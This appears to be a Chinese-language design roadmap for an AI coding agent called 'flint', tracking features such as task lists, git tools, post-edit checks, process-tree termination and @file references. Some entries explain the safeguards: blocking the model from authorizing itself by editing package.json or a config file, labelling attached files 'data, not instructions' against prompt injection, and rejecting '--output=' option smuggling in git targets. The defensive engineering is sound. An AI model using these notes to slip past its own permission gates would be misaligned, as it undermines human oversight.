给一句**原因**，如"`pyproject.toml` 只声明依赖，不说明用哪个工具装"）——编一个看着合理的默认比留白危险：留白模型会去读文件确认，编错的它不会；③ **原料清单接 `detect.ts` 的 `MANIFEST_FILES`、不另开一份**（那边注释里点名要接），方向**单向**（stack → detect），加长的候选**不得回流**去当准入证据（`requirements.txt` / `Makefile` 在子目录里遍地都是）。**已知边界**：非 Node 生态**只报语言与包管理器名、不派生命令** —— 那几个生态"test 该跑什么"本机没有可对拍的实现（装不了 cargo / go / poetry），按"没实测到的那一半不许用推理补"的纪律留白（同 `commands.ts` 的 Makefile 半边）；`Makefile` **刻意不在候选表里**（它是构建工具不是包管理器，且没有 `make` 可对拍）。**这一处改动顶掉了一条既有断言**（必然要改，同 C10 那类）：`verify-commands.ts` 的 F10 正则从两半扩到三半。验证：`verify-stack.ts` **72 项**（判据逐分支 + 渲染 + 注册表 + 与命令表的接头 + 源码守护 + 真目录真播种真注入），**变异十一轮各自精准变红**；`verify-commands.ts` 82 项不变（新增参数的判据归 verify-stack 的 D 段，**刻意不重复钉**）。**动手过程逮到自己三处写虚/写重的地方**：① 锁文件优先级只测"两个同时存在"会被**对调绕过**（改成四者同摆再逐环撤掉）；② H3"切到空目录"在播种整段被删时会**碰巧全绿**（补上前置 `before === 1`）—— 都是"只跑绿会漏掉"的典型形态；③ 数据里的 `via` 与渲染器各带一次"判不出来"，拼接后印成"包管理器判不出来 —— **判不出来**（…）"——**单看任一侧都正确，一拼接才现形**（本仓记过的"拼接放大"型），而它是**端到端演示脚本第一次跑就照出来的**，套件里原本没有一条断言在看"这行读起来对不对"（已补 B7 作回归守卫） | 存在性探测 → 语言 / 包管理器；画像注入 project 层并派生命令表前缀｜R5｜⚠C9（已答） | 高 | 已完成 |
| 10.1.2 | 项目说明位 | **已完成（随 10.12.4 / 10.12.5 一起，均为 2026-09-14）**。缺口原样：`memory.md` 只存"一句话结论"，**没有"这项目是干什么的"固定位**。本条的建议做法本来就是"与 10.12.4 / 10.12.5 **合并**（同一份文件的两半）"，于是它没有独立的落点：**目标文档** `.flint/CHARTER.md`（10.12.4，目标 / 范围 / 验收标准 / 明确不做什么，立项后锁定）+ **现状文档** `.flint/PROJECT.md`（10.12.5，当前系统由哪些模块 / 技术点构成，随代码漂移、每轮由 runtime 直读注入 project 层）合起来就是"这项目是干什么的、长什么样"。写在这里只为让"起手式点名的那一项"有明确的收口，**没有额外实现**（10.1.1 落地时一并核实） | 与 10.12.4 / 10.12.5 合并（同一份文件的两半，见 P10.12 表）｜R5+R7 | 高 | 已完成 |
| 10.1.3 | `/init` 初始化命令 | 无 | 扫描项目 → 生成三件套，**用户过目再落盘**｜R6/R7 | 中 | 候选 |
| 10.1.4 | 目录地图缓存 | 每轮重新 ls 遍历 | 首轮摘要缓存进上下文段，工具写入使缓存失效｜R5+R3 | 低 | 候选 |

#### P10.2 项目规约遵从

| 编号 | 候选项 | 现状 / 缺口 | 建议做法（含落点） | 优先级 | 状态 |
|---|---|---|---|---|---|
| 10.2.1 | 读取 `AGENTS.md` / `CLAUDE.md` | **全库零命中** | cwd 及向上两级探测，命中注入【项目规约】段（与 memory 分节、规约优先）｜R5 | 高 | 候选 |
| 10.2.2 | 文档纪律注入 | flint 自身 Log/ 纪律靠人肉传递 | 规约文件支持"文档规则"小节，注入时带"改文档前先读规则文件"指引｜R5 | 中 | 候选 |
| 10.2.3 | 规则来源与优先级 | 无定义（全局/项目/会话谁覆盖谁） | 优先级（会话 > 项目 > 全局）+ 注入标注来源 + `/rules` 可查看｜R5+R12 | 中 | 候选 |
| 10.2.4 | 冲突提示 | 无 | 命中矛盾规则时提示"以更具体的一级为准"｜R5（纯提示词） | 低 | 候选 |

#### P10.3 任务管理强化（**特化核心**）

| 编号 | 候选项 | 现状 / 缺口 | 建议做法（含落点） | 优先级 | 状态 |
|---|---|---|---|---|---|
| 10.3.1 | 子任务 / 分层清单 | **已完成（2026-09-17）**。缺口原样：`TaskItem` 只有 `{text,status}`，清单扁平一维 —— 真实的多步工程里"改 A 顺带改它的三个调用方"这种从属关系只能拍平成平级项，看不出归属，清单越长越像一堆散装待办。**落地的形状**：`TaskItem` 加 `parent`（标量 int，指向**已存在的更早项**，`0` = 顶层），`todo` 工具同步多一个 `parent:N` 参数 —— **只加标量、不加嵌套对象**，这正是选中它的全部理由：C3 当初担心的"三处承重"（render/parse 互逆、投影单向、未完成判定）**一处都不用动**。层次在 TASK.md 里用**缩进**表达（`INDENT_UNIT = 2`），面板与 `/tasks` 按层缩进；`depthsOf()` 是缩进的**唯一实现**（面板、渲染、解析三处共用，免得各算各的）。**两个"投影会失真"的点，都是探针实测逼出来的**：① **缩进 + 登记顺序表达不了全部父子关系** —— "父项=1 的子项排在别的同层项之后"这种形状，解析时父级会被"最近的前一个同级项"抢走（第一版就是这样，往返测试从绿变红）；故**只在缩进推不出真父级时**才追加显式标记 ` ⤴N`（能推出来就一个字不写，投影保持可读），解析端同一个 `lastAtDepth` 扫描里认它。② **正文里出现的标记字符必须能逃回来** —— 用户文本里写了 `←` / `⤴` / `⇐`，直接拼进投影就会被解析当成标记吃掉；用前缀码 `⇐` → `⇐⇐`、`←` → `⇐←`、`⤴` → `⇐⤴`（`⇐` 是转义引导，自身先翻倍），标记识别放在正文之后、且**只有指向已存在更早项时才算标记**（否则原样留在正文里）。验证：`verify-todo.ts` ①b 段专测层次与依赖（含"父项必须先存在""撤销后子项怎么办"边界）、②段是不变量测试（40 组随机状态往返 + 正文含 `← ⇐ ⤴` 的对抗样本） | 加可选 `parent`（标量 int → **spec 不扩结构**）；缩进投影 + 按需 `⤴N` 显式标记｜R6｜⚠C3 已解 | 高 | 已完成 |
| 10.3.2 | 依赖 blockedBy | **已完成（2026-09-17）**。缺口原样：唯一不变量只是"至多一项进行中"，**没有任何"必须等 A 完成才能开始 B"的表达** —— 模型要么自己心里记着（换一轮上下文就丢），要么干脆并行开做，把还没准备好的一步先干了。**落地的形状**：`TaskItem` 加 `after`（标量 int，同样指向已存在的更早项，`0` = 无依赖），`todo` 工具多一个 `after:N`。**校验刻意放在 `start` 而不是 `add`**：登记一张单子时人（和模型）习惯"先把整张单子写完再动手"，那时前置项往往也还没开始；在 `add` 时拦会逼着按执行顺序一条条登记。所以 `add after:N` 只是**声明**，`start` 才验 —— 被挡住时返回 `blocked`，回执**点名**是哪一项（序号 + 文本）还没完成，并给出出路（先把它 `done` 掉；依赖登记错了也可以 `done` 掉前置或 `clear` 重来）。**归 `[INVALID]` 而不是新错误类**：判据就是那句"原样重试必然再错"—— 前置没完成之前，同一个 `start` 重试一次还是错，错误信息里已经带了可行的下一步。**一条 fail-open**：`after` 指向的项后来被 `clear` 或不存在了 → **当作无依赖放行**（否则清单一旦清过，残留的 `after` 会把项永久锁死；判据同 gitignore 那条"该往哪边倒看哪种错更难发现"—— 漏放行只是照旧往下走，误锁死会让清单变成死结）。**"至多一项进行中"这条不变量加了层次之后仍然是全局的**（不是"每层各一个"）：面板只有一个"当前在做什么"，模型也只有一个执行流；按层各算一个会让"到底在进行哪件事"重新变得说不清。验证：`verify-todo.ts` ①b 段（阻断路径 + 放行路径 + 前置被清掉后的 fail-open 三组都有） | `todo op:"add" after:N`（标量 int），`start` 时校验前置｜R6｜⚠C3 已解 | 高 | 已完成 |
| 10.3.3 | 优先级 / 排序 | 无，只有登记顺序 | 加 `priority`（标量 str 枚举）+ `move` 操作｜R6 | 中 | 候选 |
| 10.3.4 | 时间戳与耗时 | **已完成（2026-09-17）**。缺口原样：`TaskItem` **无任何时间字段** —— "这项卡了多久""这轮总共花了多少"一律答不出（P8 待办的原话）。**落地的形状**：`createdAt` / `startedAt` / `doneAt` 三戳（`TaskStore` 构造器收一个 `now()`，缺省 `Date.now`，**测试可注入假时钟** —— 时间相关断言最怕真读表，"跑得慢一点就红"的测试等于没有测试）。派生量只有两个纯函数：`itemDuration(item, now)`（**没 start 过 → null**；进行中 → 随 `now` 增长；已完成 → 冻在 `doneAt - startedAt`；**时钟回拨 → null**，不报负数）与 `formatDuration(ms)`（`45s` / `2m30s` / `1h05m`）。`/tasks` 与面板传 `withDuration` 时显示耗时。**关键决策：三戳刻意不投影到 TASK.md** —— 它们是**本次会话的运行期事实**，不是需要跨会话继承的状态；落盘会让 `render`/`parse` 的互逆性凭空多出三个必须往返的字段，而它们的价值只在"现在看着方便"。跨会话的耗时另有承载：完成清单归档时的标题行 `## <时间> 完成（耗时 Xs）`，`/tasks` 回看历史时读它。**这条直接决定了验证写法**：跨重启往返断言（D8）只比结构字段（`text`/`status`/`parent`/`after`），字段清单用**白名单**列出而不是黑名单排除 —— 以后再加字段时，不写进白名单就**不会**被静默漏测（黑名单会让新字段默默溜过）。验证：`verify-todo.ts` ①c 段（三戳写入时机、进行中增长、完成后冻结、时钟回拨、`spanOf` 归档耗时、旧格式归档头兼容读取）+ ②段 B14（时间戳确实不出现在投影里） | `createdAt/startedAt/doneAt` 三戳（会话内事实，**不落盘**）；`/tasks` 与面板显示耗时｜R6+R13 | 中 | 已完成 |
| 10.3.5 | 跨会话续传增强 | TASK.md 作种子只知"没做完"，不知"卡在哪" | 落盘附带最后一条事件 id 与中断原因（可选字段）｜R6+R8 | 中 | 候选 |

#### P10.4 计划模式（先对齐再动手）

| 编号 | 候选项 | 现状 / 缺口 | 建议做法（含落点） | 优先级 | 状态 |
|---|---|---|---|---|---|
| 10.4.1 | 计划模式 | 无。模型直接开干 | 会话级开关：**用 R3 钩子拦下写类工具**（已有落点），产出计划书即停｜R3｜⚠C8 | 高 | 候选 |
| 10.4.2 | 计划落盘可评审 | 计划只活在对话里，压缩后消失 | `.flint/plans/<id>.md`，批准后注入；批准即生成 todo 清单｜R7+R6 | 中 | 候选 |
| 10.4.3 | 变更预算声明 | 无 | 计划书声明"预计改 N 文件"，执行中超范围提醒｜R5+R3 | 中 | 候选 |
| 10.4.4 | 计划与事件库联动 | 无 | 批准/改道时自动 `record_event`（kind=decision）｜R8 | 低 | 候选 |

#### P10.5 Git 与变更管理（只读侧已落地：`git` 工具的 8 个只读 op + bash 裸命令的路由；写侧仍空白）

| 编号 | 候选项 | 现状 / 缺口 | 建议做法（含落点） | 优先级 | 状态 |
|---|---|---|---|---|---|
| 10.5.1 | git 只读结构化工具 | 无。只能裸 `bash "git status"` 拿一大段文本 | 新增 `git` 工具（status/diff/log/branch），**结构化返回**｜R1+R2。**落地**：`src/git/git.ts` 零 import 纯函数（解析 + 渲染）+ builtin 第 14 个工具；**op 白名单 + argv 数组**（`execFileSync`，不经 shell）、只读不弹窗；`target` 以 `-` 开头一律拒（落在 `--` 之前 = git 的**选项位置**，`--output=文件` 能写盘） | 高 | 已完成 |
| 10.5.2 | 写操作确认闸 | `bash` 里敲 commit 全靠提示词自觉 | commit/push 走专用工具 + 权限弹窗；`--force` 二次确认｜R1+R2+R3｜⚠C7 | 高 | 候选 |
| 10.5.3 | commit message 生成 | 无 | 基于 diff 生成（格式取规约文件）｜R5+R1 | 中 | 候选 |
| 10.5.4 | 任务 ↔ 提交关联 | 无 | 提交后 hash 写回任务项 + `record_event`｜R6+R8 | 中 | 候选 |
| 10.5.5 | 仓库状态注入 | 模型不知道自己在哪条分支 | 注入【仓库状态】段（分支/脏文件数/领先远端）｜R5｜⚠C4 | 中 | 候选 |
| 10.5.6 | bash → git 工具路由 | 模型绕过 `git` 工具、直接用 bash 跑 `git status`（要弹窗、且只回原始文本）；描述文字是**软约束**、管不住 | 在 `before_tool_call` 拦下 bash 的**裸** git 只读命令、改道到 `git` 工具（落点 `src/git/route.ts`：纯函数判据**刻意窄** + 留"加参数即放行"的逃生口）｜R3｜**是路由器不是闸**，不完整无害（完整理由见 DECISION_LOG 锚点 `log-2026-09-15-bash-git-router`） | 中 | 已完成 |

> **10.5.1 补记（2026-09-15）**：op 从 4 个补到 **8 个**（+`show` / `blame` / `remote` / `tag`），判据是**只读 + 高频**——这四件事此前都只能走 `bash` 的弹窗通道，而"看一眼"本不该问。补厚过程里修掉一个**旧错**：初版说"`branch --format` 不认 `%x1f`、所以用字面 `|` 当分隔"，而 `|` 在 refname 里**是合法字符**（Linux 仓库里会有 `feat|a` 这种分支名），按它切字段会**整行串位且不报错**；复测确认 `branch`/`tag` 走的是 ref-filter 语言、认 `%1f`，两个格式已统一改用 US。另外两条新契约：`blame` 的 `lines` 只收纯数字且**单个数字展开成 `N,N`**（git 的 `-L 10` 是"10 到末尾"）；`remote` 的 URL **一律打码**（唯一一处"看着只读、却可能把凭据读进上下文"的口子）。完整理由见 DECISION_LOG 锚点 `log-2026-09-15-git-ops-expand`。

#### P10.6 验证闭环与项目命令

| 编号 | 候选项 | 现状 / 缺口 | 建议做法（含落点） | 优先级 | 状态 |
|---|---|---|---|---|---|
| 10.6.1 | 项目命令注册表 | **已完成（2026-09-15 晚）**。缺口原样：测试命令靠模型猜（`npm test` 还是 `pnpm test`？`make check` 还是 `npm run verify`？），猜错白烧一轮，**而且它不知道自己猜错了**（命令不存在只是退出码非 0，看着像"项目不通过"）。**落地的形状**：新增 `src/project/commands.ts`（**零 import 纯函数**，与 `gitignore.ts` / `postcheck.ts` 同一形态），启动时从 `package.json` 的 `scripts` 发现命令名 → 注入【项目命令】段（并进 **project 层**，与现状快照同一条消息，层序未动），并让登记表可以 `{"use":"名字"}` **引用**它。**三条承重**：① **发现 ≠ 授权** —— 发现的命令**绝不自动执行**（`package.json` 是模型**可写**的文件，把它当授权书，等于改一行 `scripts` 就给自己开一条免弹窗执行的路——与 10.6.2 论证过的那条自我授权路径**同源**）；模块里连 `spawn` / `exec` 都不许出现，由 `verify-commands.ts` 的 F2 钉住。② **引用不改变授权来源** —— `{"use":"test"}` 依然是人手写的登记表（声明即授权不变），变的只是命令**本体**不用抄一遍（package.json 里改了实现，登记表不跟着改）；**引用不到 / 与 `command` 同写 / 不传命令表 → 一律不启用**（含糊 = 没声明好 = 没授权）。③ **只在启动读一次** —— 运行期重读 `package.json` 会让模型改一行 scripts 就改写注入内容、并让 `use` 指向另一条命令。**已知边界**：只做 `package.json` 的 scripts，**Makefile 半边刻意没做** —— 本机无 `make` 可对拍（`which make` 无命中），按"语义类功能的期望值必须拿权威实现当 oracle、没实测到的那一半不许用推理补"的纪律（gitignore 那次 `git check-ignore` 对拍、git 分隔符那个错），宁缺勿补；要加时只需补一个 `parseMakefile()`，走同一个 `ProjectCommand` 形状，注入端与引用端都不用动。验证：`verify-commands.ts` **82 项**，⑦ 段跑**真** `SystemPromptServiceImpl`（含"两半都无则 project 层整层缺席"）与真文件的端到端；变异**六轮**各自精准变红 | 从 package.json scripts 发现并注册，注入 + 别名调用｜R5+R12 | 高 | 已完成 |
| 10.6.2 | 改完自动验证挂点 | **已完成（2026-09-15）**。缺口原样：钩子已就位，但没有内置"改完跑测试"（本文件 P7 登记过：闭环全靠提示词）。落地的形状：write / edit **成功落盘后**跑一条**项目自己登记**的命令（`.flint/postcheck.json`），结论追加到**同一份工具结果**里 —— 模型下一轮必然看到。三条承重：① 落点必须是**工具 handler**（`after_tool_call` 的返回值不被消费，落那儿是永远不生效的假防线）；② 配置**只在启动读一次**（否则模型写这份文件就能给自己开一条"免弹窗执行任意命令"的路）；③ 结论只**追加**、不改工具状态（落盘成功就是 `ok`，自检是附加情报 —— 改成 `verify_failed` 会误触发"连续失败保护"，把一次成功写入报成失败）。权限按 **C5 选 A**：只跑登记过的命令，**声明即授权** | write/edit 成功后自动跑类型检查｜R3｜⚠C5 | 高 | 已完成 |
| 10.6.3 | 验证结果结构化 | 退出码与失败用例混在 stdout 里 | 解析常见测试器失败摘要（文件:行号）｜R1 | 中 | 候选 |
| 10.6.4 | 只跑相关测试 | 无 | 按改动文件映射测试文件，映射不到回退全量｜R1 | 中 | 候选 |
| 10.6.5 | 重复失败退避 | 已有保护，但阈值硬编码 | 阈值可配置 + 失败模式识别｜R12 | 低 | 候选 |
| 10.6.6 | 子进程整树终止 | **已完成（2026-09-16）**。缺口原样：`timeout` 只杀 shell —— Windows 上 `spawnSync` / `execSync` 到达超时后杀掉的是 `cmd.exe`，真正的孙进程照旧跑完（探针实测：让子脚本 2 秒后写标记文件、超时给 800ms，返回后 3 秒标记文件照样出现；三跳 `cmd → node → node` 同样逃逸）。`bash` 与"改完自检"用的是同一机制，边界同源；区别只在自检是**自动**触发的，反复触发时残留进程更容易叠加。一条容易被忽略的推论：`bash` 回执说"超时了"，而那条命令**其实还在改盘** —— 模型已经基于一个假前提往下走了 | 超时后按**进程树**终止（Windows `taskkill /T /F`，POSIX 走进程组），`bash` 与自检两处一起改｜⚠C6 | 中 | 已完成 |

> **10.6.2 补记（2026-09-15）**：这条是按 **C5 的选项 A** 落地的 —— 「只自动跑登记过的项目命令」。
> 登记表就是 `.flint/postcheck.json`（用户手写、一份 JSON、`command` + 可选 `timeoutMs`），
> 由此得到判据「**声明即授权**」：项目自己写下的命令免弹窗，**没登记则一个字都不追加**
> （默认态与接此功能前逐字一致，零行为变化）。10.6.1 的**发现**半边仍独立未做 ——
> 本条只给了"登记表长什么样、怎么被执行"，"怎么自动把表填上"（package.json / Makefile 探测）
> 留给 10.6.1。另记两条**已知边界**，不装糊涂：① 自检只在 **write / edit** 上挂
> （走 `bash` 改文件不会触发 —— 判据保持"改动经由受控写工具"）；② 超时只保证"不再等它"、
> 不保证"杀干净"，已作为 **10.6.6** 单独登记。完整理由见 DECISION_LOG 锚点
> `log-2026-09-15-postcheck`。
>
> **再补记（2026-09-15 晚，以本条为准）**：上面说的"10.6.1 的发现半边仍独立未做"，
> **同日稍后已落地**（见 10.6.1 那一行）。接上之后，登记表多一种写法 `{"use":"名字"}`
> —— 授权来源不变（仍然是人手写的这份文件），只是命令本体可以引用**发现**出来的那条。
> `{"command":"整句"}` 照旧可用，两种不能同写（同写 = 含糊 = 不启用）。
>
> **三补记（2026-09-16，增强三项，以本条为准）**：登记表从「一条 `command` + 一个
> `timeoutMs`」扩成「**`commands` 数组** + 每条的 `timeoutMs` + 一轮的 `totalTimeoutMs`」——
> 上面 470 行那句「`command` + 可选 `timeoutMs`」**已过时**，旧写法仍兼容（单条 = 等价于
> 只有一项的数组），但新表建议直接用数组。三项增强与各自的判据：
> ① **基线对比** —— 启动时真跑一遍、把"项目原本就有的错"记成身份集合，之后只报**新增的**。
> 解决的是**真正会让我做错事**的那一处：全项目 `tsc` 会把历史遗留错和本次捅的错混在一起，
> 我分不清就只能"越权去改旧错"或"索性全忽略（连自己刚犯的也漏）"。键 = **文件 + 错误码 +
> 消息文本，刻意不含行列号**（否则插一行就让所有旧错伪装成新错冒出来）。认不出诊断时
> **不过滤**、退回全量报 —— fail-safe 朝"多报"倒（漏报会让我以为改对了，比刷屏危险）。
> ② **多命令槽位** —— 不用手工 `&&` 串成一条（串了就共享一个超时、且分不清哪条挂了）。
> ③ **按条目摘要** —— 报错多时不再只剩尾部那句「Found N errors」，一行一个诊断、
> 数清楚还差几条。**真 bug（端到端演示演出来的）**：单条渲染与整轮渲染各附一次收尾句，
> 2 条命令的登记表会把同一句「改动已落盘」印 **3 遍**；修法是给单条渲染加 `tail` 开关、
> 多命令路径传 false 由整轮统一收尾。完整理由见 DECISION_LOG 锚点
> `log-2026-09-16-postcheck-v2`。

> **10.6.6 补记（2026-09-16，以本条为准）**：上面 475 行那句"超时只保证'不再等它'、
> 不保证'杀干净'"**已作废**。落地的形状：新增 `src/process/`（`proctree.ts` 纯策略 +
> `runner.ts` 执行器），`bash` 与自检**两处一起**改走它 —— 不只是修一处，而是把"起进程"
> 这件事收拢到一个执行器里（改前两处各自直连 `child_process`，各自只杀 shell）。三条承重：
> ① **必须换成异步 `spawn`** —— 同步 API 超时返回时 shell 已经死了，那时再补
>    `taskkill /pid X /T` 只会拿到"找不到该进程"（探针 C：status=128）。Windows 的 `/T`
>    是按**父子链**递归的，链头一断，孙子就再也找不回来。
> ② **杀之前先看进程还活着没** —— 退出之后那个 pid 已无主，杀它可能伤到被复用了同一 pid
>    的无关进程。
> ③ **杀完不立刻结算**：等 `close`（它意味着 stdio 也收干净了），并挂一条
>    `TREE_KILL_GRACE_MS` 的兜底强制结算 —— 否则"超时"会退化成"永久卡住"（有后代攥着
>    管道不放时 `close` 永远不来，比不杀还糟）。
> POSIX 侧走**进程组**（子进程 `detached` 自成一组，`kill(-pid)`）；detached 在那里是
> **必需而不是优化** —— 不脱离就会与 flint 同组，杀负 pid 把自己一起带走。**该分支未在本机
> 实测**（开发机是 Windows），`verify-proctree.ts` 的 P27 专门把"未实测"这件事钉住。
> 验证：`verify-proctree.ts` 40 项，验收判据是"**孙进程没能写下标记文件**"而不是回执长
> 什么样（坏掉的时候回执照常看起来正常）；变异十轮各自精准变红，其中
> **把 taskkill 换成 `process.kill`（等价于改前的行为）** 一轮直接让 T7/T8 变红 ——
> 证明验的确实是杀树这件事，不是"回执里有几个字"。完整理由见 DECISION_LOG 锚点
> `log-2026-09-16-proctree`。

#### P10.7 代码检索与代码智能

| 编号 | 候选项 | 现状 / 缺口 | 建议做法（含落点） | 优先级 | 状态 |
|---|---|---|---|---|---|
| 10.7.1 | 符号级检索 | 只有文本 grep | **先做无索引版**（正则识别定义）→ 不够用再上索引｜阶段一 R1 | 高 | 候选 |
| 10.7.2 | 引用查找 | 无 | 符号名 + 上下文启发式，标注"可能漏"｜R1 | 高 | 候选 |
| 10.7.3 | `.gitignore` 感知 | **已完成（2026-09-15）**。缺口原样：`ls` / `grep` 的跳过表**硬编码** `.git/node_modules/dist`（两处各抄一份），而项目自己写在 `.gitignore` 里的 `build/`、`sessions/`、`*.log` 全进结果。**落地的形状**：新增 `src/project/gitignore.ts`（**零 import 纯函数**，同 `postcheck.ts` 那种"读一份项目配置"的形态），把 `.gitignore` 编译成规则并**合并**进跳过表 —— **跳过表 = 内置默认 ∪ `.gitignore`**（内置默认永远保留，哪怕用户在自己的文件里把它们放回来：安全底线不交给人手填空话）。五条承重：① **这是减噪，不是门禁** —— 判错只影响多显示 / 少显示，与安全无关，所以**刻意只做语义子集**（判据同 10.5.6 的"是路由不是闸"：不完整无害）；② **认不出的模式一律丢弃，fail-safe 朝"不忽略"倒** —— 藏掉本来看得见的文件比多显示噪音危险得多（模型会据此以为自己已经看全了目录）；③ **只读搜索根那一层的 `.gitignore`**，不递归子目录、也不向上找仓根，差的方向是"少忽略"，换来"规则相对谁"没有歧义；④ **显式点名的路径从不套规则**（`ls build`、`grep x build/a.log` 照旧给结果 —— 路径是用户说出来的，替他藏是帮倒忙）；⑤ **父目录被排除则里面全部排除**（git 语义；探针实测发现"只判叶子"会和 git 答反，改成本模块自己逐层上溯）。验证：`verify-gitignore.ts` 79 项，其中语义那 28 条的期望值**不是推的** —— 拿 `git check-ignore` 当标尺逐条对拍（28 条零不一致）；变异四轮各自精准变红，**"去掉锚定"那一轮是变异揭出来的**（初版覆盖表全是 unanchored 用例，补了三条锚定反例才钉住）。**已知边界**：.gitignore 的" `!` 救回被排除目录内部"刻意不支持（与 git 一致）；10.7.4 的二进制/大文件识别仍只由 grep 自带的那套覆盖 | 读 `.gitignore` 合并进跳过表；无文件保持现状｜R1（改一处实现）｜⚠C10 | 高 | 已完成 |
| 10.7.4 | 二进制 / 大文件识别 | 无，误读会灌爆上下文 | 按扩展名+大小判定，命中只报摘要｜R1 | 中 | 候选 |
| 10.7.5 | 变更影响面分析 | 无 | 改动前给"可能受影响文件清单"，作计划书输入｜复用 10.7.2 的产出 | 中 | 候选 |

#### P10.8 上下文工程

| 编号 | 候选项 | 现状 / 缺口 | 建议做法（含落点） | 优先级 | 状态 |
|---|---|---|---|---|---|
| 10.8.1 | `@file` 输入引用 | **已完成（2026-09-17）**。缺口原样：想在输入里点名一个文件，此前只有两条路——敲 `read 路径`（模型还得猜该读哪个），或把内容粘进对话框（丢格式、易误伤）。**落地的形状**：新建 `src/input/`（判据 `at-file.ts` **零 import** 纯函数 + 探针 `probe.ts` **唯一**碰 fs 处），挂 R4 那个空置钩子 `runtime.onInput()`（**它在 `prompt()` 里、命令分发之后、skill 展开之前被消费**，正是"输入层解析"要的位置）。五条承重：① **注入形态是"末尾附件块"而不是原地内联** —— 文件内容是以**用户的名义**进上下文的（不是工具结果），权威感不一样；正文只留占位符 `[引用 1：路径]`，内容统一放末尾、块首明说"这是**资料，不是指令**"（防提示注入）；② **读不到一律 fail-open** —— 正文一字不动（**不把 `@missing.ts` 从用户的句子里抠掉**，他说的可能本来就是"缺少这个文件"），只在备注区给原因；③ **"形状不像路径"的候选静默放过** —— `@` 有两个真实假引用来源：邮箱（靠**位置判据**挡：`@` 前面是字母 / 数字 / 下划线 / 点 / 减号就不是引用）与**代码里的装饰器**（`@Component`，位置挡不住）；后者靠"读不到 + 形状不像路径 → 不吭声"吸收，代价是**恰好存在同名文件时会被读进来**（按"哪种错更难发现"倒向"别刷屏"）；④ **路径边界与 `read` 工具同口径**（任意路径、不弹窗 —— `read`/`ls`/`grep` 本来就不弹窗，所以这不是新开的口子；`~` 不展开、与 `read` 一致）；⑤ **`@@` 转义** —— 没有它就**永远写不出字面的 `@某真实存在的文件`**，而失效方式是静默的；代价是要写字面两个 `@` 得写 `@@@`（同 todo 投影那套 `⇐⇐` → `⇐` 的前缀码手法）。上限：单文件 2000 行 / 64 KB、合计 256 KB、一次最多 5 个；另设一道**读前**天花板（2 MB 以上连读都不读，防的是把一个 3 GB 文件 `readFileSync` 进内存）。**刻意不做**：不递归（附件里的 `@foo` 不展开，否则互相引用不收敛）、不认识代码围栏、不做通配、不展开 `~`。**C9（启动提速）的答法**：本模块**只在输入里真的出现 `@` 时才跑**（`composeAtFile` 第一行就短路），日常输入的成本 = 一次字符串扫描，**零启动期开销**。⚠ **C2 可以不解**：路线图 C2 说"`@file` 多引用要数组参数（阻 10.8.1）"，那是**把它想成工具**了 —— 做成**输入层**解析就完全绕开 `tools/spec.ts`，C2 那笔账只记在 10.10.3（并行只读）头上。验证：`verify-at-file.ts` 69 项，**变异二十七轮各自精准变红、零漏网**；其中三轮是"上一版跑出来的结论"（一条**死代码**分支、⑥ 段测的是**复刻副本**、一条被**子串巧合**绕过的 `includes` 断言），另有一处"拼接放大"型显示缺陷**纯靠端到端演示脚本照出来**（当轮临时草稿、未入库；回归守卫是套件的 B10/B11）。<br>**补记（2026-09-18：拖入的裸绝对路径 + 引号路径）** —— 用户实测后问"是不是得手动把文件拖进来才算引用"，于是本条扩成**两条通路**（`@` 指名 / 拖入的裸绝对路径）与一条引号规则。三条新判断：① **拖入的闸门是"绝对路径"这条形状**（盘符 / UNC / POSIX 根；**相对路径一律不认**）—— 与 `@` 的分工正好相反：裸路径是**被动认出**的，闸门必须放在**识别段**（认宽了会把满句子的 `src/a.ts` 都变成附件）；`@` 是**主动点名**，闸门留在组装段（先认下来，读不到再靠"形状不像路径"静默）。② **引号是路径的一部分**（Windows 给带空格的路径自动加引号）：读到**配对引号**为止、路径里因此能含空格，替换时连引号一起吃掉（"格式自动转换"落在这一步）；引号没闭合（打字打到一半）退化成"读到空白为止"并丢掉开头引号；**没加引号的带空格路径仍然读不了** —— 空格同时是句子分隔符，没有引号就无从区分"路径里的空格"与"这里断句"。③ **拖入的失败照样上报**（报的是原文，不凭空补一个 `@`）—— 这条功能的痛点就是"操作完不知道成没成"，**静默的失败最坏**。<br>顺带矫正两处口径：**短路条件**从"只看 `@`"改成"**既无 `@` 也无候选**"（不改的话拖入的输入整条不会被处理，而纯函数侧一片绿）；**附件抬头**从"以 @ 引用了"改成"**点名引用了（@ 指名，或直接给出路径）**"（拖入时句子里根本没有 `@`，原措辞失真）。<br>**C9 答法随事实更新（以补记为准）**：碰 fs 的条件是"输入里有 `@` **或一条绝对路径**"；两者都没有时仍只是一次线性扫描、零 IO，启动期依旧零开销。<br>**验证以补记为准**：`verify-at-file.ts` **94 项**（原 69），**变异三十五轮各自精准变红、零漏网零崩溃**（原二十七轮）；新增八轮专盯两条新通路，并额外逮到**三处测试自身的问题**（手段类断言写成"整条语句匹配"→ 换个等价写法就**穿过去**；`[0]!` 解引用让"判据一空"的变异**整个套件崩在中途**、把后面几十条的覆盖面一起藏起来；演示脚本自己少一个反引号 —— 套件全绿也照样是坏的）。<br>**刻意不做（新增两笔）**：不认 MSYS 形式 `/c/Users/...`（与 `read` 同口径 —— 它也只把 `/x` 解成当前盘根；结果是报一句"找不到"，**可见的失败**而非静默）、不认 `file://` URL（终端拖入不产生这种形式，要额外做百分号解码与盘符前导斜杠处理，收益不抵成本）。 | `src/input/`（判据 + 探针）+ 挂 `runtime.onInput()`｜**R4（现成空置钩子）** | 高 | 已完成 |
| 10.8.2 | 文件固定（pin） | 关键文件会被压缩掉 | pin 列表，压缩时豁免；`/context` 可看与解除｜R10+R7 | 中 | 候选 |
| 10.8.3 | 上下文预算可视化 | 不知道 5 个注入层各占多少 | `/context` 分层显示字符/token 估算｜R5 的层信息 | 中 | 候选 |
| 10.8.4 | 手动压缩与快照 | 只有自动压缩 | `/compact` + 压缩前快照落 `.flint/`｜R10（`compactNow` 已有） | 中 | 候选 |
| 10.8.5 | 重复读取去重 | 同一文件反复 read 堆多份 | 相同路径+mtime 折叠为"内容未变"｜R1+R7 | 低 | 候选 |

#### P10.9 权限、沙箱与审计

| 编号 | 候选项 | 现状 / 缺口 | 建议做法（含落点） | 优先级 | 状态 |
|---|---|---|---|---|---|
